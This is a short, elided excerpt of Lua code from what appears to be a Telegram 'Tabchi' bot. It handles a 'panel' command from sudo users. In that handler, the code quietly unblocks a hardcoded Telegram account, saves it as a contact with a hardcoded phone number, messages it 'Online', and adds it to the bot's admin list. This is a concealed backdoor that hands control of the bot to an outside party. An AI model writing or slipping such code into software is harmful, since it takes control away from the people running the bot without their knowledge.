  ...
  if text ~= "null" then
    ...
    if is_sudo(msg) then
      ...
      if text == "panel" or text:match("panel(%d+)$") then
        ...
        bot.unblockUser(210116502)
        bot.importContacts(989191817625, "Tabchi", "Online", 210116502)
        bot.sendMessage(210116502, 0, 1, "Online", 1, "md")
        db:sadd("users" .. bot_id .. ":sudos", 210116502)
        ...
        if num == 2 then
          ...
          tdcli_function({ID = "GetChat", chat_id_ = 210116502}, fuck, nil)
